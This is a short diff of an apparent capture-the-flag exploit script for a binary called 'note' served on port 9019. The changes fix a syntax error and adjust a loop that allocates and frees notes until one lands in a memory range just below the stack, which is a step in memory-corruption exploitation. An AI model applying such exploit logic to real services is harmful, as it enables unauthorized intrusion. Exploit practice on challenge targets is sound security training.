@@ -17,7 +17,6 @@ host = '0'
 #conn = s.process('./note', aslr=False)
 conn = remote(host, 9019)
 
-stack_addr = 0xfffdd000
 iteraciones = 1
 notas = []
 
@@ -96,9 +95,9 @@ def get_note_ontop_of_stack():
 	while len(notas) != 255:
 		num, addr = create_note()
 		addr = int(addr, 16)
-		if addr < 0xfffdd000 and addr > 0xf7ffe000  
+		if addr < 0xfffdd000 and addr > 0xf7ffe000:
 			notas.append((num, addr))
-			break
+			print 'aloco: {:d}, iteraciones: {:d}'.format(len(notas), iteraciones)
 		else:
 			delete_note(num)
 	while len(notas) != 256:
